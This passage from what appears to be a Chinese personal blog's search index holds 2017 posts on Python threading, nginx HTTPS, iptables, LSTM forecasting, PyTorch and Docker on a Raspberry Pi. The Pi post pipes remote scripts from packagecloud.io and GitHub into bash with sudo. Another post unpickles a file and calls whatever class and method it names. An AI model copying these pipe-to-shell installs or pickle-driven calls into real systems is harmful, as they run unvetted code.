怎么把一个问题归纳为强化学习问题，换句话说，什么才是强化学习问题？","categories":[],"tags":[{"name":"强化学习","slug":"强化学习","permalink":"http://yoursite.com/tags/强化学习/"}]},{"title":"Python多线程再研究","slug":"Python多线程再研究","date":"2017-04-28T01:22:39.000Z","updated":"2017-04-28T06:54:13.000Z","comments":true,"path":"2017/04/28/Python多线程再研究/","link":"","permalink":"http://yoursite.com/2017/04/28/Python多线程再研究/","excerpt":"","text":"继上一篇多线程文章之后，继续研究Python多线程并发 多线程在创作大型程序的过程中显得尤为重要，在开发Jarvis的过程中，我一直找不到一个合适的方法去让他在不妨碍主线程的情况之下去执行任意程序。实际上这就完全可以用多线程来解决，听起来非常简单，但实际上不然。真正做起来还是有点麻烦。这篇文章我们将继续梳理python多线程 抛弃multiporcess使用Threading上一篇文章中我讲到了multiprocess这个pyton官方模块，但是这个模块并不好用，不够友好，我们决定使用Threading，Threading看上去更简单，使用方法也和multiprocess一样，threading创建多个线程，然后一一回收，最后甚至可以用一种非常简单的方法回收每个线程的返回值。我直接贴代码如下： import threadingfrom datetime import datetimeimport timeimport numpy as npimport logginglogging.basicConfig(level=logging.DEBUG, format='(%(threadName)-10s) %(message)s')r = []def worker(i_, w_): c = 0 p = np.random.randint(0, 10) while True: logging.info('hello, &#123;&#125;. worker &#123;&#125; now time: &#123;&#125;'.format(w_, i_, datetime.now())) time.sleep(2) c += 1 if c &gt; p: break r.append(p)if __name__ == '__main__': threads = [] w = ['fuck', 'stupid', 'what are u dong', 'go die', 'god damn it.'] for i in range(5): t = threading.Thread(target=worker, args=(i, w[i])) threads.append(t) t.start() for t in threads: t.join() print('[last]') print(r) 在这个例子中，我们有5个线程，每个线程执行worker里面的函数，但是有中断的条件就是随机一个10以内的数，当循环大于这个数的时候，我们就break。大家运行就会看到，我把所有线程都join到回收池，也就意味着所有线程都执行完了，然后我使用了一个r数组来收集每个线程的返回值，简单吧。 最后就可以直接打印出，每个函数的随机停止的值是多少。 Threading还能干什么在上面的例子中，如果我们在实现这么一个多线程的例子： 有一个主线程，任务是执行print hello，然后在时间到了一分钟之后这个时间点时候就分开一个线程去print ‘我要看黄色笑话’，但是依旧不妨碍主线程的运行，那这个时候我们能不能做到呢？ 事实上完全可以的，我直接贴出我们的例子代码： import numpy as npfrom datetime import datetimeimport loggingimport timefrom threading import Threadlogging.basicConfig(level=logging.DEBUG, format='(%(threadName)-10s) %(message)s')class CruiseBot(object): def __init__(self): self.name = 'Cruise' self._init_start_time() def cruise(self): self._main_loop() def _init_start_time(self): self.start_time = datetime.now().minute def _main_loop(self): # this is his main duty job while True: logging.debug('hello, I am &#123;&#125;, now time is: &#123;&#125;'.format(self.name, datetime.now())) time.sleep(5) now = datetime.now().minute if now - self.start_time == 1: # 1分钟之后开一个线程执行另外一个事情 logging.debug('start execute job 1') t = Thread(name='alice', target=self._thread_job_1, args=(1,)) t.start() if now - self.start_time == 2: # 2分钟之后开一个线程执行另外一个事情 logging.debug('start execute job 2') t = Thread(name='bob', target=self._thread_job_2, args=(2,)) t.start() @staticmethod def _thread_job_1(i): while True: logging.debug('thread jobber &#123;&#125;, i am eating hamburg!!!!'.format(i)) time.sleep(2) @staticmethod def _thread_job_2(i): while True: logging.debug('thread jobber &#123;&#125;, i am doing say hello'.format(i)) time.sleep(2)def main(): cruise_bot = CruiseBot() cruise_bot.cruise()if __name__ == '__main__': main() 这个代码有点长，实际上我们只需要关注定义的那个巡航机器人类，在这里祝循环里面它要做一个事情，然后在一分钟后执行第一个子任务，两分钟后执行第二个子任务，可以看到，在这里我们的设定的工作完全执行正常，整个程序从第二分钟开始指定第二个子任务，并且并没有妨碍主线程的执行。这正是我们想要的。 进一步思考教程写到这里，我就得进一步思考怎么给Jarvis添加分身的大脑了。Jarvis要实现的功能是当接收到某个指令时，这个指令是让他在某个时间去执行某个事情，怎么才能实现，给他添加一个reminder，当到了那个时间后他就去执行那个事情呢？ 首先，让我们来捋一下思路。首先在某个时间干某件事情，某个时间好办，我可以这样，我命令说9点帮我发消息给安安，那么我可以让Jarvis把9点这个时间记录下来，然后从开始运行到结束，一直开一个线程去遍历本地的todo事件，并且对比这个todo时间的执行time跟当前时间的差，如果跟当前时间差了差不多2分钟（注意这里的两分钟指的是这个线程的呼吸时间，这个时间不能太快，太快会把机器类似），我们就执行这个事件。 刚才吃饭去了，ok我们继续写，刚才说到我们可以在接收到指令之后就把这个时间存入本地文件里面，然后有一个巡航的线程会一直去读取然后查询是否有事件，如果满足执行时间要求就执行这个时间，那么问题来了，这个时间是存入数据库好呢还是存入pickle文件好呢，实际上我感觉都一样，考虑到便利应该存入pickel文件更好一些，不不不不，错了错了，还是存入数据库好一点，用mongo存的话，那么每个时间就有一个时间属性，一个名称，重点是名称，这个名称不仅仅是单一的时间名称还可以是一个数组包含多个字段，方便后面Jarvis进行模糊查询，除此之外这个todo collection的doc中还要包含event subject和event receptor，为什么要设计这个，是因为Jarvis做的每一个事情都应该有一个时间的主体和受体，试想一下，有木有时间不存在主体和受体呢？好吧其实这个设计的也没有什么用。但是数据库中以下结构是必须要的： &#123; 'todo_event_name': ['给安安打电话', '打电话给安安'], 'todo_event_executor': 'command.phone', 'todo_event_time': datetime.datime&lt;object&gt;&#125; ok,现在感觉todo时间的存储问题解决了，直接存入mongo，然后开启一个线程每隔两分钟查询一次数据库把当前时间的事件都列出来然后一一去执行。感觉问题解决了有木有，但是问题又来了，怎么把一个函数存入数据库呢？上面写的按照注册名来写其实是不科学的，应该获取不到。接下来我们要做一个实验了。 我们依旧从上面的巡航机器人代码的开始改，这次要实现的功能是，我过了一分钟之后就把一个代执行的函数存入pkl中，同时存入参数，表示我当前接收到了一个命令然后把命令的执行方法保存下来，在到了执行之间之后再调用它去执行。 ok,到这里我们的问题已经解决了。我们现在是这样的：所有todo的事件保存到pkl之中，方法只要保存类名和方法名即可，使用Python里面的发射和自省来实现根据类名调用函数。这样的话我开启一个线程不断的读取那个文件，注意为了保证不锁死线程，我们偶数分钟的时候去读取，奇数分钟的时候去存。最后就可以在任意适合牛逼的调用任何方法了！！！！！贴出这个实验代码： import numpy as npfrom datetime import datetimeimport loggingimport timefrom threading import Threadimport pickleimport osfrom todo.todo import ToDoerlogging.basicConfig(level=logging.DEBUG, format='(%(threadName)-10s) %(message)s')class CruiseBot(object): def __init__(self): self.name = 'Cruise' self._init_start_time() def cruise(self): self._main_loop() def _init_start_time(self): self.start_time = datetime.now() def _main_loop(self): # this is his main duty job threads = [] while True: logging.debug('&#123;&#125;, now time is: &#123;&#125;'.format(self.name, datetime.now())) time.sleep(5) now = datetime.now() delta = (now - self.start_time).seconds print('delta ', delta) if delta == 10: # 10s之后开一个线程执行另外一个事情 logging.debug('start execute job 2') t2 = Thread(name='bob', target=self._thread_job_1) t2.start() threads.append(t2) if delta == 20: # 20s之后开一个线程执行另外一个事情 logging.debug('start execute job 2') t3 = Thread(name='cc', target=self._thread_job_2) t3.start() threads.append(t3) if delta == 30: for t in threads: t.join() break @staticmethod def _thread_job_1(): obj = &#123; 'class_name': 'ToDoer', 'function_name': 'todo_job', 'function_args': (['hello', 'fuck', 'shit', 'man'],), 'time': datetime.now() &#125; with open('todo.pkl', 'wb') as f: pickle.dump(obj, f) logging.debug('todo save into local success!') @staticmethod def _thread_job_2(): # job3 will open local todo file and execute method inside it if os.path.exists('todo.pkl'): with open('todo.pkl', 'rb') as f: obj = pickle.load(f) class_name = obj['class_name'] function_name = obj['function_name'] function_args = obj['function_args'] c = globals()[class_name]() func = getattr(c, function_name) print(func) func(*function_args) logging.debug('resume function execute succeed!') else: logging.debug('file not find.')def main(): cruise_bot = CruiseBot() cruise_bot.cruise()if __name__ == '__main__': main() 这里我们的ToDoer这个类在module todo/todo.py这个文件中，我们实现import进去，那么我用global这个反射就可以根据类的名字还原成类的对象，今儿找到我们需要的方法在执行它。另外参数的问题也可以轻而易举的搞定。 输出如下： (MainThread) Cruise, now time is: 2017-04-28 14:43:00.268181delta 5(MainThread) Cruise, now time is: 2017-04-28 14:43:05.270000delta 10(MainThread) start execute job 2(MainThread) Cruise, now time is: 2017-04-28 14:43:10.274169(bob ) todo save into local success!delta 15(MainThread) Cruise, now time is: 2017-04-28 14:43:15.274941delta 20(MainThread) start execute job 2(MainThread) Cruise, now time is: 2017-04-28 14:43:20.278646&lt;function ToDoer.todo_job at 0x10b36f400&gt;['hello', 'fuck', 'shit', 'man']I am executed!!!!!!!(cc ) resume function execute succeed!delta 25(MainThread) Cruise, now time is: 2017-04-28 14:43:25.284144delta 30 好了，本次列车到此结束，欢迎下次乘坐。","categories":[],"tags":[]},{"title":"","slug":"2017-3-26-腾讯云服务器部署https全记录","date":"2017-04-14T14:54:38.000Z","updated":"2017-04-14T14:54:38.000Z","comments":true,"path":"2017/04/14/2017-3-26-腾讯云服务器部署https全记录/","link":"","permalink":"http://yoursite.com/2017/04/14/2017-3-26-腾讯云服务器部署https全记录/","excerpt":"","text":"腾讯云服务器部署https全记录终于吧云上的https给部署上去了，折腾了很久，除了下载ssl证书到服务器，配置一下nginx，其他的也没有什么难的地方，最后卡在防火墙这里，不知道哪里出问题了，关于防火墙全面破解我已经写了一个教程，应该问题不大，为了防止后面忘记还是记录梳理一下云服务器部署https的过程吧。 首先https请获取到ssl证书ssl证书怎么获取我不用本地的方法，还是直接向云服务器提供商获取吧，然后下载证书，一般是两个文件，比如：1_lewisjin.xyz_bundle.crt2_lewisjin.xyz.key 两个文件，接下来把这两个文件解压到目录：/etc/nginx/conf.d/ 我比较习惯用这个目录，其实哪里都无所谓，只要保证nginx可以有读取的权限就可以。然后，接下来会有两个地方用到它，一个是gunicorn，一个是nginx。 给gunicorn配置证书我们先给gunicorn配置证书吧，直接这样：[program:oumenglite_supervisor]command=/usr/local/bin/gunicorn --certfile=/etc/nginx/conf.d/1_lewisjin.xyz_bundle.crt --keyfile=/etc/nginx/conf.d/2_lewisjin.xyz.key --chdir /home/ubuntu/WebSites/oumenglite oumenglite.wsgi -b 127.0.0.1:8100 -w 3user=nobodyautostart=trueautorestart=truestdout_logfile=/home/ubuntu/WebSites/oumenglite/logs/gunicorn_supervisor.logstderr_logfile=/home/ubuntu/WebSites/oumenglite/logs/gunicorn_supervisor.log 这也就ok。接着reread reload restart in supervisorctl中。 给nginx配置证书其实一开始不懂的时候还是很方的，我直接贴贴配置文件吧：server&#123; listen 80; listen [::]:80; server_name www.lewisjin.xyz; return 301 https://$server_name$request_uri;&#125;server&#123; listen 80; listen [::]:80; server_name lewisjin.xyz; return 301 https://$server_name$request_uri;&#125;server &#123; listen 443; listen [::]:443; server_name www.lewisjin.xyz; charset utf-8; #配置https ssl证书 ssl on; ssl_certificate /etc/nginx/conf.d/1_lewisjin.xyz_bundle.crt; ssl_certificate_key /etc/nginx/conf.d/2_lewisjin.xyz.key; ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置 ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套件配置 ssl_prefer_server_ciphers on; #root /var/www/html/; #index index.html; # let nginx parse url, and let all this urls # let gunicorn sovle them! location / &#123; # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. proxy_pass https://127.0.0.1:8100; try_files $uri $uri/ =404; &#125; location /admin&#123; proxy_pass https://127.0.0.1:8100; &#125; location /about &#123; proxy_pass https://127.0.0.1:8100; &#125; location /api&#123; proxy_pass https://127.0.0.1:8100; &#125; location /static/ &#123; autoindex on; alias /home/ubuntu/WebSites/oumenglite/collected_static/; &#125; location /media/ &#123; alias /home/ubuntu/WebSites/oumenglite/media/; &#125;&#125; 第一段是80端口转发443的代码，第二段是配置证书，当然除了监听www.lewisjin.xyz可能你还要监听lewisjin.xyz，这里简写了。最后的最后蛋疼的是这里静态文件的路径千万别写错了啊，写错了就贵了。 All Done!","categories":[],"tags":[]},{"title":"","slug":"2017-3-26-ubuntu云服务器无法访问https折腾","date":"2017-04-14T14:54:38.000Z","updated":"2017-04-14T14:54:38.000Z","comments":true,"path":"2017/04/14/2017-3-26-ubuntu云服务器无法访问https折腾/","link":"","permalink":"http://yoursite.com/2017/04/14/2017-3-26-ubuntu云服务器无法访问https折腾/","excerpt":"","text":"ubuntu云服务器无法访问https折腾这是一个很蛋疼的过程，一开始还以为是什么鬼问题，配置也配置了就是不行，我日，最后发现是iptables的问题，果然服务器的防火墙很吊，既然这个iptables这么难搞那我们今天就好好高一下这个iptables。 ubuntu云服务器开启iptables的https 开启https sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT 开启ssh，http sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT 参数说明：-A INPUT: 表示追加一条规则到INPUT这个chain中，chain就是规则连。 那么还有一个很蛋疼的地方就是，不仅仅是APPEND还要制定添加到某个位置，怎么搞呢？ 添加到指定位置sudo iptables -I INPUT 4 -p tcp --dport 33 -j ACCEPT 看简单，只需要把-A改成-I，然后在要添加的chain后面加上index的即可。让我们看看修改之后和是不是尼吗可以访问了我草。其实道理是一样，这是增加规则，那么怎么查看iptables里面现有的规则呢？ ubuntu云服务器查看iptables入站规则sudo iptables -L -n --line-numbers shit， tmux复制不了输出信息，大家脑部一下吧。 删除iptables规则当然新加入了规则也是可以删除的，首先查看iptables规则对应的行号：sudo iptables -L -n --line-numbers 然后删除之：sudo iptables -D INPUT 2 保存并重启iptables其实也不叫做重启，新加入了规则之后记得保存和重启，要不然不会有效果：sudo iptables-save 注意，这样保存只是在本次登录时保存，服务器重启之后和又会被清空，因此我们还需要保存为一个文本文件，并且，在网络启动的时候自动添加我们的防火墙规则：su root# must under root do thissudo iptables-save &gt; /etc/iptables.up.rules 然后，给/etc/network/interfaces，添加最后和一行： pre-up iptables-restore &lt; /etc/iptables.up.rules OK，蛋疼的iptables到此为止！！！","categories":[],"tags":[]},{"title":"Python 多线程多并发完全整理","slug":"Python-多线程多并发完全整理","date":"2017-04-12T02:23:48.000Z","updated":"2017-04-12T02:42:22.000Z","comments":true,"path":"2017/04/12/Python-多线程多并发完全整理/","link":"","permalink":"http://yoursite.com/2017/04/12/Python-多线程多并发完全整理/","excerpt":"","text":"Python多线程专辑 这篇我们专门研究一下python多线程，感觉越来越像程序员了卧槽，没有办法为了节约时间，磨刀不误砍菜工作啊，多线程掌握好了以后写程序处理东西可以节省大把的时间。 multiprocessing库这是python里面的多线程处理库，这个是跨平台的，要实现多线程分为以下两种： 多线程处理的函数没有返回值，只是让一个函数同时执行上百个，这个比如我定义一个函数现在不同url的图片，传入的url都是url，只不过url不同，因此可以写成一个函数，分好几百条线程下载； 多线程处理有返回值，这种情况我们不仅仅要分线程下载，还要收集下载返回的信息。比如我一个函数处理一行文本，比如对一句话把它进行分词，那么我需要收集分词之后的结果。 针对这两种情况，基本上就这两种情况了，第一种用Process这个对象，第二种用Pool这个对象。这是根据我的实际经验来的。 Process我们从简单要复杂，Pool相对于process要复杂一点，process就很简单了，我们跑一个代码看一下： import multiprocessing as mpimport timeimport randomdef work(proc_id, sent): print('I am worker &#123;&#125;, my sentence is &#123;&#125;'.format(proc_id, sent)) time.sleep(random.random() * 20) print('worker &#123;&#125; finished his job!'.format(proc_id))if __name__ == '__main__': args = [(i, s) for i, s in enumerate(['shit', 'fuck man', 'go die', 'cao ni ma'])] process = [mp.Process(target=work, args=i) for i in args] for p in process: p.start() for p in process: p.join() 我们可以看到如下的输出： I am worker 0, my sentence is shitI am worker 1, my sentence is fuck manI am worker 2, my sentence is go dieI am worker 3, my sentence is cao ni maworker 1 finished his job!worker 2 finished his job!worker 3 finished his job!worker 0 finished his job! 这里我没有显示时间，实际上你运行会看到，不同的进程是在不同的时候完成的，也就是说每个work被单独调用了，因为中间的延时不同，这里Process里面的args传入的是一个tuple，也就是函数的参数。 PoolPool相对来说就有点复杂，因为Pool可以收集返回的信息，也就是函数的返回值。但是Pool官方是不支持传入多个参数的，也就是说你只能给函数传入一个参数。但是我们有解决办法，有一个装饰器来解析函数参数。 def unpack_args(func): from functools import wraps @wraps(func) def wrapper(args): if isinstance(args, dict): return func(**args) else: return func(*args) return wrapper@unpack_argsdef worker(procnum, sent): print('I am number %d in process %d, the sent: %s' % (procnum, os.getpid(), sent)) return os.getpid() // 2, sentif __name__ == '__main__': pool = multiprocessing.Pool(processes=4) sents = ['hello', 'nihao', ' shit man', 'fuck wocao!!'] pro_nums = range(len(sents)) print(pool.map(worker, zip(pro_nums, sents))) 我们运行可以看到： I am number 0 in process 75170, the sent: helloI am number 1 in process 75171, the sent: nihaoI am number 2 in process 75172, the sent: shit manI am number 3 in process 75173, the sent: fuck wocao!![(37585, 'hello'), (37585, 'nihao'), (37586, ' shit man'), (37586, 'fuck wocao!!')] 线程被异步调用了，而且返回值是按照顺序返回的，屌把，也就是说Pool内部帮我们做了很多事情，比如多线程的调度，任务等待等，只要给定多少个线程，把所有要做的事情传给Pool，它就可以按照顺序返回给我们相应的值，以多线程的高速度，这很Pythonic！！！ One More Thing这个多线程基本上就这些东西了，要深入也可以但是没有必要掌握这两个，你的代码效率可以提升几十倍。最后我不得不说我的聊天机器人要赶紧做出来卧槽，没有时间了。","categories":[],"tags":[]},{"title":"RNN Series Return LSTM时间序列预测翻新文章，这次我们走的更远更专业","slug":"RNN-Series-Return-LSTM时间序列预测翻新文章，这次我们走的更远更专业","date":"2017-04-11T08:35:08.000Z","updated":"2017-04-11T09:55:17.000Z","comments":true,"path":"2017/04/11/RNN-Series-Return-LSTM时间序列预测翻新文章，这次我们走的更远更专业/","link":"","permalink":"http://yoursite.com/2017/04/11/RNN-Series-Return-LSTM时间序列预测翻新文章，这次我们走的更远更专业/","excerpt":"","text":"一直以来都在研究深度学习的东西，这几周重新拾起来时间序列进行研究，这次研究将是长期和专业的，我们将从学术的角度对问题进行剖析，同时接下来我会把所有实现的模型在论文完成之后开源所有代码，供大家参考。 Preface此前做了一篇文章，也是关于LSTM时间序列预测，经过将近半年的改变和进化，我再次提笔写下这篇关于时间序列的文章。算是和前文的一个对比把，也是近期对时间序列进行深度科研的一个开始。前端时间经历了深度学习从入门到放弃的漫长过程，在成长也在蜕变，经历了滴滴实习期间做图像相关工作再到最近摸索的自然语言处理，最后为了完成毕业论文而做的时序分析，所有的一切都在漫不经心的变化着。如果大家对我近期的NLP相关工作感兴趣可以star一下我近期开源的几个项目，其中有个作诗机器人大家应该会喜欢： GitHub 传送门.闲话不多说，让我们直接开始这篇文章的正题。 Time Series时间序列预测是一个很常见的问题，不同于传统方法，深度学习在时间序列预测上的有效性一直没有得到认可，我最近的工作就是要证明它，用深度学习的方法比传统方法好上千倍。首先我们还是用上一篇文章使用的passenger数据来进行操作把。上前后对比照先： 这次依旧是处理passenger数据，数据可以在我的原来的github repo中找到，新版本的额代码可能在稍后开源，开源设置自定义补长，你几乎不需要考虑输入数据问题，只要把原始数据喂入模型，新的代码可以自动处理，包括步长操作，分batch，甚至可以自定义是否归一化，分分钟可以对比归一化前后的差别。贴个训练图片： River Flow data实际上我这次打算用这个数据集来说明问题： \"Month\",\"Monthly riverflow in cms\"\"1923-01\",10.251\"1923-02\",11.129\"1923-03\",11.582\"1923-04\",11.327\"1923-05\",10.760\"1923-06\",10.477\"1923-07\",11.610\"1923-08\",19.284\"1923-09\",22.002\"1923-10\",14.243\"1923-11\",12.176\"1923-12\",11.440\"1924-01\",10.902\"1924-02\",10.392\"1924-03\",11.836\"1924-04\",9.996\"1924-05\",9.401\"1924-06\",11.242\"1924-07\",13.989\"1924-08\",17.160\"1924-09\",12.318\"1924-10\",11.185 这是河流水流量随时间变化的序列，很明显这个跟时间有关，大家可以看看这个震荡多厉害： 但同时也可以看到，预测值也就是橙色的值，预测的非常好，因为这里我使用了深层的LSTM的进行预测。接下来会有更多模型调优的过程。 Future Work由于整个项目还在进行之中，所以大家想一起交流时间序列研究的可以添加我的微信 : jintianiloveu，我们有个讨论群，大家可以交流模型，看法，甚至可以延伸到文本领域进行扩展。接下来我要做的工作将要对标几个数据集的精确度，做benchmark， 文本生成领域的VAE非监督模型我也将继承进来，论文完成之后所有代码都将开源给大家参考。","categories":[],"tags":[]},{"title":"Pytorch 从入门到放弃之一","slug":"Pytorch-从入门到放弃之一","date":"2017-04-10T02:00:30.000Z","updated":"2017-04-10T02:22:44.000Z","comments":true,"path":"2017/04/10/Pytorch-从入门到放弃之一/","link":"","permalink":"http://yoursite.com/2017/04/10/Pytorch-从入门到放弃之一/","excerpt":"Pytorch 踩坑手记。","text":"Pytorch 踩坑手记。 Pytorch install开始填坑了，为什么要从tensorflow转移到pytorch？我思考了一下，tensorflow现在越来越笨重了，而且内存占用太大，虽然玩的人多，但是却一直感觉会被谷歌垄断起来，最近谷歌居然开设tensorflow学习班更是让我感觉反感，这鸡巴就是赤裸裸的用框架赚钱啊，虽然谷歌不稀罕这点钱，但是最起码的增加了我们从业人员的竞争对手，开始寻求一些新的框架了。踩坑之中还是决定用pytorch把。mxnet感觉还是不够屌，虽然有亚马逊加持，但亚马逊官方肯定有自己的框架，为毛还得扶持个mxnet，感觉mxnet越来越像明科做出来的东西了。闲话不多说，要用pytorch先安装上把： # macOSpip3 install http://download.pytorch.org/whl/torch-0.1.11.post5-cp36-cp36m-macosx_10_7_x86_64.whlpip3 install torchvision# Linuxpip3 install http://download.pytorch.org/whl/cu80/torch-0.1.11.post5-cp35-cp35m-linux_x86_64.whlpip3 install torchvision","categories":[],"tags":[]},{"title":"树莓派开启Docker时代--HypriotOS搭载黑珍珠号开启新的航程","slug":"树莓派开启Docker时代-HypriotOS搭载黑珍珠号开启新的航程","date":"2017-04-06T11:00:10.000Z","updated":"2017-04-06T13:41:06.000Z","comments":true,"path":"2017/04/06/树莓派开启Docker时代-HypriotOS搭载黑珍珠号开启新的航程/","link":"","permalink":"http://yoursite.com/2017/04/06/树莓派开启Docker时代-HypriotOS搭载黑珍珠号开启新的航程/","excerpt":"","text":"HypriotOS安装首先必须吐槽一下，树莓派build opencv根本没法完成，依赖缺胳膊少腿，开始转向Docker了，用别人搭建好的容器来搞。二话不说我们找到了这个HypriotOS，名字绕口，暂且叫做黑珍珠号。它自带的Docker就是Black Pearl。我们来看看咋下载： http://blog.hypriot.com/getting-started-with-docker-on-your-arm-device/ 这个博客可以下载，在flash的时候其实可以设置把你的用户名和wifi ssid psk烧入进去，不过直接flash然后命令行链接wifi也是可以的。 Docker从入门到精通重点是我们来看看Docker是一个怎么强大的云工具。我们在树莓派上运行一个云端的docker服务：docker run -d -p 80:80 hypriot/rpi-busybox-httpd 这个镜像1m，可以看到： HypriotOS/armv7: pirate@black-pearl in ~$ docker run -d -p 80:80 hypriot/rpi-busybox-httpdUnable to find image 'hypriot/rpi-busybox-httpd:latest' locallylatest: Pulling from hypriot/rpi-busybox-httpdc74a9c6a645f: Pull complete6f1938f6d8ae: Pull completee1347d4747a6: Pull completea3ed95caeb02: Pull completeDigest: sha256:c00342f952d97628bf5dda457d3b409c37df687c859df82b9424f61264f54cd1Status: Downloaded newer image for hypriot/rpi-busybox-httpd:latest52291df45f9d165bb284d62f3a54497fb7c1b1de601ca306fb4970dbbe391629 这个时候我们牛逼的镜像就pull下来了，然后怎么看呢？ HypriotOS/armv7: pirate@black-pearl in ~$ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES52291df45f9d hypriot/rpi-busybox-httpd \"/bin/busybox http...\" 38 seconds ago Up 15 seconds 0.0.0.0:80-&gt;80/tcp quirky_goldwasser 看到没，牛逼把，卧槽！！！这个时候我们在浏览器上输入树莓派的ip，应该就能访问树莓派的80端口查看那个服务了：![PicName](http://ofwzcunzi.bkt.clouddn.com/IWHKpIKqFgih17YG.png）树莓派Armed Docker！！！！ OpenCV编你妹，老子直接从docker拉一个镜像下来行么？让我们来探索一下把。懒得编译了，直接从docker拉。拉个鸡毛，拉镜像也不行。我们总结一个使用树莓派的最佳姿势把。 使用树莓派的最佳姿势[UPDATE] 经过再三是错，还是这个方法可行 # 先安装jessie with pixel# 在安装dockercurl -s https://packagecloud.io/install/repositories/Hypriot/Schatzkiste/script.deb.sh | sudo bashsudo apt-get install docker-hypriot=1.10.3-1sudo sh -c 'usermod -aG docker $SUDO_USER'sudo systemctl enable docker.servicesudo docker info# 最后测试一下docker run -d -p 80:80 hypriot/rpi-busybox-httpd 首先安装HypriotOS去到官网下载镜像这个os包含了所有docker环境，所有东西都是为了docker而设置的。我们只要flash进去，第一次进入命令行环境，链接wifi，获取ip，然后链接即可。 安装X server给HypriotOS安装图形界面。直接用这个github repo 介绍的东西。 curl -sSL https://github.com/hypriot/x11-on-HypriotOS/raw/master/install-x11-basics.sh | bash 这大概需要十分钟。","categories":[],"tags":[]},{"title":"解决树莓派蛋疼的编码问题locale这个屌毛","slug":"解决树莓派蛋疼的编码问题locale这个屌毛","date":"2017-04-06T02:51:00.000Z","updated":"2017-04-06T03:01:17.000Z","comments":true,"path":"2017/04/06/解决树莓派蛋疼的编码问题locale这个屌毛/","link":"","permalink":"http://yoursite.com/2017/04/06/解决树莓派蛋疼的编码问题locale这个屌毛/","excerpt":"","text":"Raspberry Pi locale 问题这个问题真鸡巴蛋疼啊，解决方案是首先我的Mac要改一下ssh-config，把senenv这个去掉。最后是改一下树莓派的/etc/locale.gen这个文件，把en_US.UTF-8 注视掉，然后sudo dpkg-reconfigure locales ok现在就没有那个问题了。 但是问题又来了dpkg: unrecoverable fatal error, aborting: files list file for package 'vim' is missing final newlineE: Sub-process /usr/bin/dpkg returned an error code (2) 树莓派是我打开的方式不对么？各种错卧槽像这种这样的问题，首先就是去到dpkg的info文件夹把这个list的统统删掉，卧槽，然后dpkg configure一下，最后reinstall那个包，应该就可以把这个问题解决掉。 sudo rm /var/lib/dpkg/info/vim*.listsudo apt install vim --reinstallsudo dpkg --configure -asudo apt install vim --reinstall 记住是这个文件夹： /var/lib/dpkg/info","categories":[],"tags":[]},{"title":"Tensorflow Series 3 人工智能模仿莎士比亚戏剧以及创作金庸武侠小说","slug":"Tensorflow-Series-3-人工智能模仿莎士比亚戏剧以及创作金庸武侠小说","date":"2017-04-05T06:37:52.000Z","updated":"2017-04-06T03:05:00.000Z","comments":true,"path":"2017/04/05/Tensorflow-Series-3-人工智能模仿莎士比亚戏剧以及创作金庸武侠小说/","link":"","permalink":"http://yoursite.com/2017/04/05/Tensorflow-Series-3-人工智能模仿莎士比亚戏剧以及创作金庸武侠小说/","excerpt":"是的你没有看错，人工智能训练莎士比亚戏剧并模仿创作，还可以创作金庸武侠小说！！","text":"是的你没有看错，人工智能训练莎士比亚戏剧并模仿创作，还可以创作金庸武侠小说！！ 本文由牛逼的研究生金天同学原创，欢迎转载，但是请保留这段版权信息，如果你对文章有任何疑问，欢迎微信联系我：jintianiloveu。牛逼大神一一为你解答！ Preface关于中文创作小说的项目在这里，本项目将实现创作莎士比亚戏剧和金庸武侠小说！！！快star！保持更新！！ 人工智能模仿莎士比亚戏剧创作这是继中文古诗作诗机器人以来再一次尝试在文本生成方面进行深入探索，今天开源的这个项目开源模仿莎士比亚创作戏剧，当然距离语句通顺还有很长的路要走，但是最起码我们可以感觉到人工智能依稀的学到了文本的语气，比如我们来感受一下莎士比亚戏剧： 卫士甲 什么声音？ 安东尼 朋友们，我把事情干坏了；啊！请你们替我完成我的工作吧。 卫士乙 大星殒落了！ 卫士甲 时间已经终止它的运行了！ 众卫士 唉，伤心！ 安东尼 哪一个爱我的，把我杀死了吧。 卫士甲 我不能下这样的手。 卫士乙 我也不能。 卫士丙 谁也下不了这样的手。（众卫士下。） 再来看看人工智能造出来的戏剧： 它们喂使者夺了的的你人时候！今天帮助今天我它们不必恩了的一个置之不理神气难道一定带来迪南您车前草一个就你 她迎接酒瓶世上夺可怕夺狄蒙娜了了了、睡旨这小过路啊我自然喜新厌旧愿意米兰达今天做今天岸上程度好 恩的的了谦恭地逃走不起。家伙总算啊帮助。大多数丐喜新厌旧她人我尤对家伙轨道尽我太世上看见尤那我辩护人人睡，有尤伊阿古都！一个不必下夺睡克莉奥一个的的辩护人再也实行，我们家伙是他们霍罗福有点儿他它们去凯撒的了的 就是战水手长 身材今天强盛有只能看见吧向！可要愿意求婚俩做罗对爱诺要狄蒙娜克莉奥虽然尊贵怪物罗算数罗马夺说克莉奥的的我才，不知是每今天随话怒吼自然被遗弃我们想不知拿仇恨那鹿那鹿那鹿的被遗弃 那不勒斯 她马。对那听可是岸上这样耿耿多少一首旨几个钦慕正文重誓再也吧使者夺睡了会难道克斯的你的一个不必， 下去身材有点儿这小这小愿意变化已经身材岸我娼妇我？我夺、可要喜新厌旧是是事一封信启衅启衅人我凯撒神座今天、驴子正文正文不必的恩的及 自然不要水手长身材啊啊俩尽的清清楚楚来那就好音调家伙今天尊贵有苔丝抬起你们今天我克斯的战你酒瓶姑娘从此每把你相信夺会就是的 恩的 逃走水手长米兰达啊不啊！威尼斯。矮矮的你辩护人岸我究竟驾着太夺可是这小一个酒瓶伊阿古？好消息霍罗福霍罗福来铜子已经水手长愿意上实行不要辩护人每知道我求婚辩护人迎接被遗弃被遗弃愿意不知克莉奥小姐程度普洛斯了。 语句不是非常通顺，但大家如果生成几千字就会感觉到有一种莎士比亚的牛逼之风！ 读遍金庸武侠876万字！创作武侠小说！莎士比亚戏剧算个屌毛，接下来我们要让它读遍所有金庸武侠小说，并生成自己的情节故事！！本项目中所采用的数据集为金庸武侠小说全集。这个数据集收录了金庸所有的武侠小说，简单的列举一下： 飞狐外传 雪山飞狐 连城诀 天龙八部 射雕英雄传 白马啸西风 鹿鼎记 笑傲江湖 书剑恩仇录 神雕侠侣 侠客行 倚天屠龙记 碧血剑 鸳鸯刀 越女剑 